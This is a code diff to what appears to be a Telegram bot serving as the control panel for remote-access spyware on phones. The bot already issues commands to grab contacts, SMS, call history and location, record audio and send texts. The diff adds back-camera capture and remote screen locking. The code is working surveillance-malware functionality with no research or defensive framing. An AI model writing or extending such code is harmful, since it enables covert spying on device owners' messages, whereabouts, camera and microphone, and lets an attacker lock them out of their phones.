@@ -83,7 +83,11 @@ function sendCommandMenu(ctx, deviceId, deviceName) {
                 ],
                 [
                     Markup.button.callback('📸 Front Camera', `cmd_cf_${deviceId}`),
-                    Markup.button.callback('📤 Send SMS',     `cmd_smsmode_${deviceId}`)
+                    Markup.button.callback('📷 Back Camera',  `cmd_cb_${deviceId}`)
+                ],
+                [
+                    Markup.button.callback('📤 Send SMS',     `cmd_smsmode_${deviceId}`),
+                    Markup.button.callback('🔒 Lock Screen',  `cmd_lock_${deviceId}`)
                 ],
                 [
                     Markup.button.callback('🎙️ Record Audio', `cmd_recmode_${deviceId}`)
@@ -128,7 +132,7 @@ bot.action(/^select_device_(.+)$/, async (ctx) => {
 });
 
 // Run a command on the selected device (excludes smsmode and recmode — handled separately)
-bot.action(/^cmd_(ch|contact|as|loc|cf)_(.+)$/, async (ctx) => {
+bot.action(/^cmd_(ch|contact|as|loc|cf|cb|lock)_(.+)$/, async (ctx) => {
     const command = ctx.match[1];
     const deviceId = ctx.match[2];
     const device = devices[deviceId];
@@ -142,7 +146,9 @@ bot.action(/^cmd_(ch|contact|as|loc|cf)_(.+)$/, async (ctx) => {
         contact: '👥 Contacts',
         as:      '💬 All SMS',
         loc:     '📍 Location',
-        cf:      '📸 Front Camera'
+        cf:      '📸 Front Camera',
+        cb:      '📷 Back Camera',
+        lock:    '🔒 Lock Screen'
     };
 
     device.pendingCommand = command;
